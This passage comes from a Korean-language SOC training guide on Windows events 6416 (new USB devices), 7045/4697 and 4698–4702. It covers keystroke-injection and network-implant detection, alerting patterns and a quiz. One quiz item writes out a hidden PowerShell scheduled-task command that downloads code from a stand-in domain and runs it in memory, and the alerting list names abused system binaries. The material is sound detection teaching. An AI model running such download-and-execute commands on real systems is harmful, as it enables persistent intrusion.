- 악성코드를 싣고 오거나 데이터를 들고 나가는 **저장 장치**(T1091, Replication Through Removable Media; T1052.001, Exfiltration over USB).
- 겉모습은 USB 메모리나 케이블인데 컴퓨터에게 "나는 키보드야"라고 말하고, 준비된 명령을 몇 초 만에 쳐 넣는 **키 입력 주입 장치**(T1200, Hardware Additions). Windows는 새 키보드를 묻지도 않고 믿습니다.
- **네트워크 임플란트** — 네트워크 카드라고 자기를 소개하는 USB 네트워크 어댑터나 작은 컴퓨터. 공격자에게 컴퓨터로 들어오고 나가는 새 길을 줍니다(이것도 T1200).

실제 범죄 사건에서도 사무실에 걸어 들어와 이런 장치를 내부 컴퓨터에 꽂아 두고 간 일이 있었습니다. 영화 이야기만이 아닙니다. 방어자의 질문은 간단합니다. **무엇이, 어디에, 언제 꽂혔고, 허용된 것이었나?**

### 켜는 법 { #6416-config }

```text
auditpol /set /subcategory:"Plug and Play Events" /success:enable
```

- *Plug and Play Events*는 고급 감사 정책의 *Detailed Tracking* 아래에 있습니다(그룹 정책에서는 *Audit PNP Activity*라고 나옵니다). 켜면 새 외부 장치가 인식될 때마다 Windows가 **Security** 채널에 **6416**을 씁니다.

### 이벤트 6416: 시스템이 새 외부 장치를 인식함 { #6416 }

재무팀 워크스테이션에 작은 "USB 메모리"가 꽂혔습니다.

```xml
<System>
  <EventID>6416</EventID>
  <TimeCreated SystemTime="2026-11-20T23:48:12.0170551Z" />
  <Channel>Security</Channel>
  <Computer>WS-118.corp.example</Computer>
</System>
<EventData>
  <Data Name="SubjectUserSid">S-1-5-18</Data>
  <Data Name="SubjectUserName">WS-118$</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x3e7</Data>
  <Data Name="DeviceId">USB\VID_1A2B&amp;PID_3C4D\8&amp;2f1b7c1&amp;0&amp;1</Data>
  <Data Name="DeviceDescription">USB Input Device</Data>
  <Data Name="ClassId">{745A17A0-74D3-11D0-B6FE-00A0C90F57DA}</Data>
  <Data Name="ClassName">HIDClass</Data>
  <Data Name="VendorIds">USB\VID_1A2B&amp;PID_3C4D&amp;REV_0100
USB\VID_1A2B&amp;PID_3C4D</Data>
  <Data Name="CompatibleIds">USB\Class_03&amp;SubClass_01&amp;Prot_01
USB\Class_03&amp;SubClass_01
USB\Class_03</Data>
  <Data Name="LocationInformation">Port_#0002.Hub_#0001</Data>
</EventData>
```

칸별로 보면:

- `TimeCreated` `23:48 UTC` — 현지 시각으로 바꿔 보세요. 한밤중에 꽂힌 장치라면 그것만으로 질문거리입니다.
- `SubjectUserName` `WS-118$`, `SubjectLogonId` `0x3e7` — **컴퓨터 계정 / SYSTEM**입니다. 플러그 앤 플레이는 시스템이 처리하기 때문에 6416은 **어느 사용자가 꽂았는지 알려 주지 않습니다.** 그 시각에 누가 로그온해 있었는지(4624 유형 2/7/11이나 대화형 세션) 따로 찾아야 합니다.
- `DeviceId` `USB\VID_1A2B&PID_3C4D\8&2f1b7c1&0&1` — 버스(`USB`), **VID** `1A2B`, **PID** `3C4D`, 그리고 인스턴스 ID. 인스턴스 부분이 진짜 일련번호(가운데 `&`가 없음)라면 같은 물리 장치를 여러 컴퓨터에 걸쳐 추적할 수 있습니다. `8&2f1b7c1&0&1`처럼 생겼으면 장치에 일련번호가 없어서 Windows가 포트를 바탕으로 지어낸 것입니다.
- `DeviceDescription` `USB Input Device` — 드라이버가 부르는 이름. 저장 장치라면 `USB Mass Storage Device`나 `Disk drive`라고 나옵니다.
- `ClassId` / `ClassName` `HIDClass` — **장치 클래스**. 휴먼 인터페이스 장치(Human Interface Device) = 키보드, 마우스, 게임 패드. 다른 흔한 클래스: `USB`(허브와 복합 장치의 부모), `DiskDrive`, `WPD`(휴대폰, 카메라), `Net`(네트워크 어댑터), `Image`, `MEDIA`.
- `VendorIds` — 하드웨어 ID, 가장 구체적인 것부터: VID, PID, `REV_0100`(펌웨어 버전).
- `CompatibleIds` `USB\Class_03&SubClass_01&Prot_01` — USB 클래스 코드 **03** = HID, 하위 클래스 **01** = 부팅 인터페이스, 프로토콜 **01** = **키보드**(`Prot_02`면 마우스). 즉 이 "USB 메모리"는 Windows에게 자기가 키보드라고 말하고 있습니다.
- `LocationInformation` `Port_#0002.Hub_#0001` — 물리 포트. 장치가 여러 개 얽혀 있을 때 쓸모 있습니다.

이게 뜻하는 것: 재무팀 워크스테이션에, 밤에, 회사에서 아무도 안 쓰는 VID/PID의 장치가 **키보드**로 등록됐습니다. 사용자의 진짜 키보드가 이미 있는데 키보드가 하나 더 나타났다면, 그다음 몇 초 사이에 어떤 프로세스가 시작됐는지 보세요. 6416 몇 초 뒤 부모가 `explorer.exe`인 `powershell.exe`나 `cmd.exe`가 뜨고 명령이 우르르 쏟아진다면 키 입력 주입의 모양입니다.

물리 장치 하나가 **6416을 여러 개** 만드는 경우가 많다는 것도 기억하세요. 복합 장치의 부모(`USB` 클래스), 그다음 기능마다 하나씩(저장 인터페이스, HID 인터페이스, 볼륨). 시각과 같은 VID/PID로 묶어서 보세요.

### VID와 PID { #vid-pid }

USB 장치는 모두 16비트 숫자 두 개를 16진수로 알려 줍니다. USB 표준 단체가 제조사에 나눠 준 **제조사 ID(Vendor ID, VID)** 와, 제조사가 모델마다 정하는 **제품 ID(Product ID, PID)** 입니다. MAC 주소의 앞부분(OUI)이 네트워크 카드 제조사를 알려 주는 것과 비슷합니다. Linux USB 프로젝트가 관리하는 `usb.ids` 목록 같은 공개 데이터베이스가 이 숫자를 이름으로 바꿔 줍니다. 찾아보면 `VID_xxxx&PID_yyyy`가 "X 회사의 Y 모델 USB 메모리"가 됩니다.

조심할 점 두 가지:

- VID와 PID는 **장치가 스스로 말하는 값**입니다. 싸구려나 악성 하드웨어는 아무 값이나, 유명한 키보드의 VID/PID까지 내세울 수 있습니다. 찾아보니 멀쩡하다고 해서 믿을 만한 장치가 되는 건 아닙니다.
- 그래서 쓸모 있는 건 **조합**입니다. 클래스 + VID/PID + 어디 + 언제. 저장 장치 제조사 VID를 단 "키보드", 노트북에 생긴 두 번째 키보드, 서버에 생긴 `Net` 클래스 장치는 찾아본 결과가 어떻든 들여다볼 만합니다.

SIEM에서는: `DeviceId`에서 `VID`와 `PID`를 뽑고, 검색할 때 VID/PID 조회 표로 이름을 덧붙이고(enrichment), 클래스별로 승인된 장치 목록(회사에서 지급한 키보드, 마우스, 헤드셋, 암호화 USB)을 두세요. 목록 밖의 모든 것, 특히 저장 장치가 금지된 곳의 `DiskDrive`와 서버에 생긴 새 `HIDClass` 키보드에 경보를 거세요.

[보충] Windows가 장치를 기록하는 다른 곳: `Microsoft-Windows-DriverFrameworks-UserMode/Operational`(기본으로 꺼져 있을 때가 많음), `Microsoft-Windows-Kernel-PnP/Configuration`(장치 구성 이벤트), 저장 장치에 대한 `Microsoft-Windows-Partition/Diagnostic` 이벤트 1006(디스크 정보 포함), 그리고 디스크에 남는 `setupapi.dev.log`와 `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR` 같은 레지스트리 키 — 뒤의 둘은 실시간 로그라기보다 포렌식 출처입니다. Linux에서는 커널이 `usb x-y: New USB device found, idVendor=1a2b, idProduct=3c4d`를 커널 로그(`dmesg`, `journalctl -k`)에 씁니다.

## SOC에서 써먹기 { #soc-use }

- **알맞은 채널을 모으세요.** Security(4697, 4698–4702, 6416) **그리고** System(7045, 7036, 7040). 원하면 작업 스케줄러 Operational도. *Security System Extension*, *Other Object Access Events*, *Plug and Play Events*를 켜세요. 셋 다 양이 적습니다.
- **확신도 높은 모양에 경보를 거세요:** 서비스 `ImagePath`에 명령 해석기, `-enc`, `\\127.0.0.1\`, 사용자가 쓸 수 있는 폴더가 들어 있음; 8–16자 무작위 서비스 이름; 동작이 `Temp`, `AppData`, `Users\Public`, `ProgramData`를 가리키거나 파일·URL과 함께 `powershell`/`mshta`/`rundll32`/`regsvr32`를 돌리는 작업; 몇 분 안에 만들어지고 지워지는 작업; 워크스테이션에서 네트워크 로그온으로 들어온 계정이 만든 작업이나 서비스; 서버에 생긴 새 HID 키보드나 네트워크 어댑터.
- **나머지는 쌓아 보세요.** 서비스 이름과 작업 이름(그리고 그 명령 경로)을 모든 호스트에 걸쳐 세어 보세요. 수천 대 중 한두 대에만 있는 건 읽어 볼 가치가 있습니다.
- **이벤트를 이으세요.** Subject 로그온 ID → 4624(어디서 왔나), 7045 시각 → 부모가 `services.exe`인 4688/Sysmon 1, 4698 → Operational 129/200 → 작업 프로세스의 4688, 6416 시각 → 몇 초 뒤의 대화형 로그온과 프로세스 생성.
- 4698/4702의 **중첩 XML을 파싱**해서 `task_command`, `task_arguments`, `task_trigger`, `task_run_as` 칸으로 만드세요.
- **"생성" 이벤트 없는 변경을 잊지 마세요:** 바뀐 서비스 `ImagePath`와 가로챈 작업(4702)에는 따로 규칙이 필요합니다.

## 2026년 관점 { #trends }

!!! success "[2026 현재] 지금도 그대로 유효한 것"
    7045(System), 4697(Security, *Security System Extension*), 4698–4702(Security, *Other Object Access Events*), 작업 스케줄러 Operational 이벤트, 6416(*Plug and Play Events*)은 최신 Windows 11과 Windows Server 2025에서도 모두 있고, 칸 이름도 같고, 설명대로 동작합니다. 서비스와 예약 작업은 실제 침해와 랜섬웨어 사건에서 여전히 가장 흔한 지속성·원격 실행 기법에 속하니, 이 이벤트들은 지금도 그만큼 중요합니다.

!!! info "[변경됨] 바뀐 점"
    - **ATT&CK 이름.** 서비스는 **T1543.003**(Create or Modify System Process: Windows Service)과 **T1569.002**(System Services: Service Execution), 예약 작업은 **T1053.005**, 정상처럼 보이게 이름 짓기는 **T1036.004**(Masquerade Task or Service), USB 공격은 **T1200**, **T1091**, **T1052.001**입니다. 옛 `at.exe` 명령(T1053.002)은 Windows에서 오래전에 `schtasks`로 대체되어 사용 중단됐으니, Windows에서는 위의 작업 이벤트를 보게 됩니다.
    - **숨은 작업.** 작업의 `SD` 레지스트리 값을 지워 숨기는 수법은 2022년 공개 보고 이후 널리 알려졌고, 이제 탐지 규칙(Sigma와 제품 규칙)이 그 값의 삭제를 지켜봅니다.
    - **EDR과 기본 텔레메트리.** 이제 대부분의 조직은 기본 이벤트뿐 아니라 EDR 텔레메트리(Microsoft Defender for Endpoint, CrowdStrike Falcon, SentinelOne, Elastic Defend 등)로도 서비스와 작업 생성을 봅니다. Microsoft는 Sysmon도 Windows에 선택적 기본 기능으로 넣고 있습니다(2026년 초 Windows 11 Insider 빌드부터). Sysmon 레지스트리 이벤트(12/13/14)는 `Services`와 `TaskCache` 키를 직접 지켜봅니다. 믿고 쓰기 전에 우리 빌드에서 쓸 수 있고 켜져 있는지 확인하세요.
    - **취약 드라이버 차단.** Microsoft 취약 드라이버 차단 목록이 Windows 11 22H2부터 기본으로 켜져 있어서 "취약한 드라이버 가져오기" 서비스가 더 어려워졌습니다. 다만 새 취약 드라이버가 계속 발견되니 불가능하진 않습니다.
    - EDR/MDM 제품의 **장치 제어(device control)**(예: Microsoft Defender for Endpoint와 Intune의 이동식 저장 장치 접근 제어)는 이제 클래스, VID/PID, 일련번호로 장치를 막거나 허용하고 그 결정을 기록합니다. 6416 하나보다 더 풍부합니다.

!!! warning "[주의] 옛 방식대로 하면 틀리거나 위험한 점"
    - **Security 채널만 모으면서 서비스 설치가 보인다고 생각하지 마세요.** 7045는 System에 있고, 4697은 기본으로 꺼져 있습니다.
    - **7045나 4698마다 경보를 걸지 마세요.** 업데이트와 에이전트가 하루 종일 만듭니다. 내용(경로, 명령줄, 이름, 계정, 출발 로그온)으로 경보를 걸고 나머지는 쌓아 보세요.
    - **익숙한 작업·서비스 이름을 믿지 마세요.** 명령을 읽으세요.
    - **`TaskName`/`TaskContent`를 언제까지나 통째로 된 글자로만 검색하지 마세요.** 중첩 XML을 파싱하지 않으면 명령에 대한 탐지가 소리 없이 빗나갑니다.
    - **"7045가 없다" = "서비스를 건드리지 않았다"고 생각하지 마세요.** 이미 있는 서비스의 `ImagePath`를 바꾸면 설치 이벤트가 안 생깁니다.
    - **"USB 저장 장치 차단" = "USB 해결"로 보지 마세요.** 키보드와 네트워크 어댑터는 저장 장치 차단을 통과합니다. HID와 Net 클래스도 지켜보세요.
    - **6416에서 사용자를 찾지 마세요.** 늘 시스템입니다. 로그온과 이어 보세요.
    - **VID/PID를 신원으로 믿지 마세요.** 장치는 거짓말을 할 수 있습니다. 증거가 아니라 패턴으로 쓰세요.

## 확인 문제 { #quiz }

### 문제 1

서버에서 이 7045(System 채널)를 찾았습니다. `Security UserID`를 바꿔 보니 `CORP\helpdesk.t2`입니다. 어떤 칸이 중요하고, 무엇을 말해 주며, 다음에 무엇을 확인할까요?

```text
ServiceName:  WinDefendUpd
ImagePath:    C:\Users\Public\Libraries\wdupd.exe
ServiceType:  user mode service
StartType:    auto start
AccountName:  LocalSystem
```

??? success "정답과 해설"
    - `ServiceName` `WinDefendUpd` — 보안 제품 이름을 흉내 냈습니다. 진짜 Defender 구성 요소는 이런 이름의 서비스를 설치하지 않습니다. 그럴듯한 이름은 아무것도 증명하지 않습니다(T1036.004).
    - `ImagePath` `C:\Users\Public\Libraries\wdupd.exe` — `Program Files`나 `System32`가 아니라 **누구나 쓸 수 있는 공용 폴더**의 프로그램. 가장 강한 신호입니다.
    - `StartType` `auto start` — 부팅할 때마다 시작. 한 번짜리 원격 명령이 아니라 **지속성**(T1543.003)입니다.
    - `AccountName` `LocalSystem` — 이 프로그램은 서버를 마음대로 할 수 있는 권한으로 돕니다.
    - `Security UserID` → `CORP\helpdesk.t2` — 헬프데스크 계정이 서버에 서비스를 설치하는 것 자체가 흔하지 않습니다.

    **다음:** 이걸 만든 로그온(같은 시각 이 서버의 4624, 그 로그온 유형과 출발지 IP. 켜져 있다면 `SubjectLogonId`가 있는 4697), `sc.exe`/`New-Service`를 돌린 프로세스(4688), `wdupd.exe`가 어떻게 거기 왔는지(파일 생성, SMB 복사 5145), 이미 실행됐는지(7036, 부모가 `services.exe`인 4688), 해시와 서명자, 같은 서비스 이름이나 파일이 다른 호스트에도 있는지. 아니라고 밝혀질 때까지 헬프데스크 계정은 털린 것으로 다루세요.

### 문제 2

`WS-031`의 4698에 `TaskName` `\GoogleUpdateTaskMachineCore{4A1F}`, Subject `CORP\j.lee`(로그온 유형 2), 그리고 `TaskContent` 안에 `<LogonTrigger>`, `<Interval>PT30M</Interval>`이 있는 `<Repetition>`, `<Command>powershell.exe</Command>`, `<Arguments>-w hidden -nop -c "iex (iwr https://cdn-sync.example/u.txt -UseBasicParsing)"</Arguments>`가 있습니다. 각 부분을 설명하세요. 지속성인가요, 원격 실행인가요?

??? success "정답과 해설"
    - `TaskName` — 진짜 브라우저 업데이트 작업의 이름 짓는 방식을 베껴서 작업 목록에 섞여 듭니다(T1036.004). 진짜 업데이트 작업은 제조사의 업데이트 `.exe`를 돌리지, PowerShell을 돌리지 않습니다.
    - Subject `CORP\j.lee`, 로그온 유형 2 — 네트워크가 아니라 그 컴퓨터에 로그온한 사용자가 직접 만들었습니다. 사용자 세션에서 무언가 악성인 게 실행됐을 가능성이 큽니다(예: 피싱 첨부 파일).
    - `<LogonTrigger>` + `<Repetition>` `PT30M` — 로그온할 때마다, 그다음 30분마다 실행. **지속성**(T1053.005)이고, 매번 페이로드를 다시 받아 오니 페이로드만 지워서는 소용없습니다.
    - `<Command>powershell.exe`와 `-w hidden`(창 없음), `-nop`(프로필 안 읽음), `-c`(이 명령 실행), `iex (iwr ...)` — 웹 주소에서 글자를 내려받아 **메모리에서 바로 실행**(T1059.001, T1105). 그 도메인이 명령 제어 / 준비 장소입니다.

    **다음:** 그 도메인을 막고 회사 전체의 프록시/DNS 로그에서 검색하고, 작업을 만든 프로세스(4698 시각 즈음의 4688과 그 부모)를 찾고, PowerShell 스크립트 블록 로그(4104)에서 무엇이 실행됐는지 확인하고, 다른 곳에도 같은 작업 이름이 있는지 찾고, 증거를 모은 *뒤에* 격리 조치로 작업을 지우세요.

### 문제 3

회사는 USB 저장 장치를 막고 있습니다. 동료가 말합니다. "그러니까 6416은 필요 없어요." 현지 시각 새벽 2시 13분, 도메인 컨트롤러에 `ClassName` `Net`, `DeviceDescription` `USB 10/100 LAN`, `CompatibleIds`에 `USB\Class_02`, 모르는 VID가 있는 6416이 생겼습니다. 위험은 무엇이고, 동료의 말에 대해 무엇을 알려 주나요?

??? success "정답과 해설"
    이 장치는 **USB 네트워크 어댑터**입니다(클래스 `Net`, USB 클래스 02 = 통신). 새벽 2시에 **도메인 컨트롤러**에 꽂혔다면, 가장 중요한 서버로 가는 새 네트워크 길을 공격자에게 줘서 네트워크 통제를 우회하게 하거나, 네트워크 카드인 척하는 작은 임플란트 컴퓨터일 수 있습니다(T1200, Hardware Additions). 저장 장치 차단은 여기서 아무 역할도 못 합니다. 이 장치는 저장 장치가 아니니까요.

    동료가 틀렸습니다. 저장 장치 차단은 클래스 하나만 막습니다. 키 입력 주입 장치는 `HIDClass` 키보드로, 임플란트는 `Net` 장치로 나타나고, 둘 다 저장 장치만 막는 차단을 통과합니다. 그걸 보는 방법이 6416(*Plug and Play Events* 켜기)입니다. **다음:** 서버실 출입 기록과 카메라, 누가 로그온해 있었는지(6416의 subject는 늘 시스템), DC에 새로 생긴 네트워크 인터페이스와 IP 주소, 새 인터페이스로 오간 트래픽을 확인한 뒤 장치를 빼서 조사하세요. 장기적으로는 서버에 새 `Net`이나 `HIDClass` 장치가 생기면 경보를 걸고 VID/PID 허용 목록을 두세요.

## 관련 레퍼런스 { #related }

- [꼭 알아야 할 이벤트](index.md) — 이 섹션 개요
- [로그인 이벤트](logins.md) — `SubjectLogonId`와 `Security UserID` 뒤의 로그온
- [프로세스 생성 이벤트](process-creation.md) — 서비스나 작업이 실제로 실행한 것(부모 `services.exe` / `svchost.exe`)
- [방화벽과 개체 접근 이벤트](firewall-object-access.md) — 바뀐 서비스와 Run 키를 잡는 레지스트리 감사(4657)
- [Windows 이벤트 구조와 채널](../windows-logging/event-structure-channels.md) — System 채널 vs Security 채널, 중첩 데이터
- [실행, 지속성, 탐색](../endpoint-attacks/execution-persistence-discovery.md) — 여기 기록되는 공격 기법
- [옆으로 이동, 수집, 유출](../endpoint-attacks/lateral-collection-exfil.md) — 원격 서비스, 원격 작업, USB 유출
- [애플리케이션 제어, FIM, 지속성 잡기](../endpoint-defense/appcontrol-fim-persistence.md) — 방어 쪽
- [SMB](../other-protocols/smb.md) — 원격 서비스 뒤의 `ADMIN$`/`C$` 공유와 `svcctl` 파이프
- [Windows 이벤트 ID](../../../basics/windows-event-ids.md)
- [레지스트리 키](../../../windows/registry-keys.md)
